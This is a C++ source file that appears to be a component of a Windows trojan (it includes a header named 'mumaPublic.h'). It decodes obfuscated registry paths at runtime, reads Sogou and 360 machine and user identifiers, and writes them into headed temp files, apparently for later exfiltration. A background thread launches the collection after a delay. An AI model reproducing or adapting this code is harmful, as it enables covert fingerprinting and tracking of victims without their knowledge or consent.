// HardwareStr.cpp: implementation of the HardwareStr class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "HardwareStr.h"
#include "WinApi.h"
#include "mumaPublic.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

HardStrWrite::HardStrWrite()
{
	SendCount = 0;
	offset    = 1024;
	SendBuf   = new char[HARDSTRLEN*MAXCOUNT+1024];	
}

HardStrWrite::~HardStrWrite()
{
	if (SendBuf != NULL)
	{
		delete []SendBuf;
		SendBuf = NULL;
	}
}

BOOL HardStrWrite::WriteBuf(const char * Buf, DWORD Buflen, BOOL bFinish)
{
	if(Buflen>0)
	{
		SendCount++;

		memcpy(SendBuf+offset, Buf, Buflen);
		offset += Buflen;
	}

 //	OutputDebugString("WriteBuf");

	if (SendCount >= MAXCOUNT || (bFinish && offset>1024))
	{
		offset += sprintf(SendBuf+offset,"%d",SendCount);

		char tmpbuf[1024];
		// 生成描述信息
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		
		char hardstrfilename[MAX_PATH];
		char hardstrfilea[MAX_PATH];
		char FixDir[10];
		strcpy(FixDir, GetTmpPrevFix(FIX_SYSTEMINFO));
		CreateFileName(FixDir, hardstrfilename, hardstrfilea);		// 得到目标文件名
		int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: hardwarestr\r\n\r\n",
			nowtime.wYear, nowtime.wMonth, nowtime.wDay,
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond, hardstrfilea, offset-1024);
		
		int datalen = offset-1024 + len;
		memcpy(SendBuf+1024-len, tmpbuf, len);

		char *pBuffer = new char[datalen+10];
		memset(pBuffer, 0, datalen+10);
		memcpy(pBuffer, SendBuf+1024-len, datalen);
		
		myWriteFile(pBuffer, datalen, hardstrfilename, hardstrfilea);
		
		delete []pBuffer;
		memset(SendBuf, 0, HARDSTRLEN*SendCount+1024);
		SendCount = 0;
		offset = 1024;
		
		Sleep(2000);
	}
	
	return TRUE;
}

BOOL HardStrWrite::WriteOneData(const char *szHardStr, const char *szType)
{
	char buf[HARDSTRLEN];
	DWORD buflen;
	
	buflen = 0;
	memset(buf, 0, HARDSTRLEN);
	buflen = sprintf(buf, "%d\t%s\t%s\n", SendCount, szType, szHardStr);
	
	WriteBuf(buf, buflen);
	
	return TRUE;
}

BOOL HardStrWrite::WriteEnd()
{
	WriteBuf("", 0, TRUE);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////

HardStrFun::HardStrFun()
{
	
}

HardStrFun::~HardStrFun()
{
	
}

BOOL HardStrFun::Deal()
{
	char TmpDecodeStr[100];
	unsigned char tmp[2*MAX_PATH+10];
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len;
	
	//SOFTWARE\\SogouDesktopBar
	if(PRegOpenKeyExA(HKEY_CURRENT_USER,
		DepubStringA(TmpDecodeStr, 100, "AIt-NPWi\\Akskafw2bekXQVo"),
		0,
		KEY_QUERY_VALUE,
		&hkey) == ERROR_SUCCESS)	//打开键失败
	{
		len=2*MAX_PATH+10-1;
		res=PRegQueryValueExA(hkey, DepubStringA(TmpDecodeStr, 100, "Zy:"), 0, &type, tmp, &len); //hid
		
		PRegCloseKey(hkey);
		
		if(res == ERROR_SUCCESS)	//查询键值失败,或者值类型不是字符串
		WriteOneData((const char *)tmp, "sogou");
	}

	//SOFTWARE\\SogouInput\\red
	if(PRegOpenKeyExA(HKEY_CURRENT_USER,
		DepubStringA(TmpDecodeStr, 100, "AIt-NPWi\\AkskaUxXae\\ow:"),
		0,
		KEY_QUERY_VALUE,
		&hkey) == ERROR_SUCCESS)	//打开键失败
	{
		len=2*MAX_PATH+10-1;
		res=PRegQueryValueExA(hkey, DepubStringA(TmpDecodeStr, 100, "qU"), 0, &type, tmp, &len); //HI
		
		PRegCloseKey(hkey);
		
		if(res == ERROR_SUCCESS)	//查询键值失败,或者值类型不是字符串
		WriteOneData((const char *)tmp, "sogou");
	}

	//SOFTWARE\\360Safe\\LiveUp
	if(PRegOpenKeyExA(HKEY_LOCAL_MACHINE,
		DepubStringA(TmpDecodeStr, 100, "AIt-NPWi\\nr7AVlw\\SyEwMX"),
		0,
		KEY_QUERY_VALUE,
		&hkey) == ERROR_SUCCESS)	//打开键失败
	{
		len=2*MAX_PATH+10-1;
		res=PRegQueryValueExA(hkey, DepubStringA(TmpDecodeStr, 100, "hy:"), 0, &type, tmp, &len); //mid
		
		PRegCloseKey(hkey);
		
		if(res == ERROR_SUCCESS)	//查询键值失败,或者值类型不是字符串
		WriteOneData((const char *)tmp, "360");
	}

	WriteEnd();
	
	return TRUE;
}


//////////////////////////////////////////////////////////////////////////

DWORD WINAPI ThreadGetHardStr(LPVOID lp)
{
	Sleep(5000);
	
	HardStrFun hardstr;
	hardstr.Deal();
	
	return 0;
}

DWORD ThreadGetHardStrStart(char * pPara)
{
	DWORD dwID;
	
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		ThreadGetHardStr, 
		NULL,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return 0;
}